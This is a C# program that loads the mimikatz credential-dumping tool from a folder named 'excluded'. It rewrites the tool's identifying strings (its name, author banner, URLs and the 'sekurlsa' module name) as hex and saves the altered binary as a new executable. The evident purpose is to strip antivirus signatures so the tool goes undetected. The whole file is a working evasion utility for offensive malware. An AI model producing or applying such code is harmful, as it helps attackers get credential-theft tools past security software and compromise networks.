using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ReplaceString
{
    class Program
    {
        static void Main(string[] args)
        {
            var hexrep = ExeToHex(@"C:\tools\excluded\mimikatz.exe");
            string replacedHex = ReplaceString(hexrep, @"mimikatz", "mimifish");
            replacedHex = ReplaceString(replacedHex, @"## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )", @"           /*** Benjamin fishY  gentilfish  ( benjamin@gentilfish.com )");
            replacedHex = ReplaceString(replacedHex, @".#####.   mimifish 2.2.0 (x64) #18362 May 13 2019 01:35:04", @"          mimifish 2.2.0 (x64)        May 13 2019         ");
            replacedHex = ReplaceString(replacedHex, @"'#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/", @"                                                                       ");
            replacedHex = ReplaceString(replacedHex, @".## ^ ##.  ", @"           ");
            replacedHex = ReplaceString(replacedHex, @"## \ / ##       > http://blog.gentilkiwi.com/mimifish", @"                                                     ");
            replacedHex = ReplaceString(replacedHex, @"'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )", @"                                                                        ");
            replacedHex = ReplaceString(replacedHex, @"sekurlsa", @"sekufish");




            HexToExe(replacedHex);
        }

        public static string ExeToHex(string filename)
        {
            var miMimi = System.IO.File.ReadAllBytes(filename);
            //Convert byte-array to Hex-string
            StringBuilder hexBuilder = new StringBuilder();
            foreach (byte b in miMimi)
            {
                string hexByte = b.ToString("X");

                //make sure each byte is represented by 2 Hex digits
                string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                hexBuilder.Append(tempString);
            }

            return hexBuilder.ToString();
        }

        public static string ReplaceString(string hexFileInMemory, string find, string replace)
        {
            byte[] ba = Encoding.Unicode.GetBytes(find);

            //var hexString = BitConverter.ToString(ba);
            StringBuilder hexBuilderFind = new StringBuilder();
            foreach (byte b in ba)
            {
                string hexByte = b.ToString("X");

                //make sure each byte is represented by 2 Hex digits
                string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                hexBuilderFind.Append(tempString);
            }


            var search = hexBuilderFind.ToString().Replace("{", "").Replace("}", "");
            
            var isFound = hexFileInMemory.Contains(search);
            if (isFound)
            {
                byte[] baReplace = Encoding.Unicode.GetBytes(replace);

                //var hexString = BitConverter.ToString(ba);
                StringBuilder hexBuilderReplace = new StringBuilder();
                foreach (byte b in baReplace)
                {
                    string hexByte = b.ToString("X");

                    //make sure each byte is represented by 2 Hex digits
                    string tempString = hexByte.Length % 2 == 0 ? hexByte : hexByte.PadLeft(2, '0');

                    hexBuilderReplace.Append(tempString);
                }
                return  hexFileInMemory.Replace(hexBuilderFind.ToString(), hexBuilderReplace.ToString());

            }
            else
            {
                return hexFileInMemory;
            }
     

        }
        public static void HexToExe(string hex)
        {
            //Convert Hex-string from DB to byte-array

            var hexSting = hex;
            int length = hexSting.Length;
            List<byte> byteList = new List<byte>();

            //Take 2 Hex digits at a time
            for (int i = 0; i < length; i += 2)
            {
                byte byteFromHex = Convert.ToByte(hexSting.Substring(i, 2), 16);
                byteList.Add(byteFromHex);
            }
            byte[] byteArray = byteList.ToArray();


            using (System.IO.BinaryWriter srBackToEXE = new System.IO.BinaryWriter(File.OpenWrite(@"C:\tools\excluded\mimihex.exe")))
            {

                srBackToEXE.Write(byteArray);
                srBackToEXE.Flush();
            };
        }
    }


}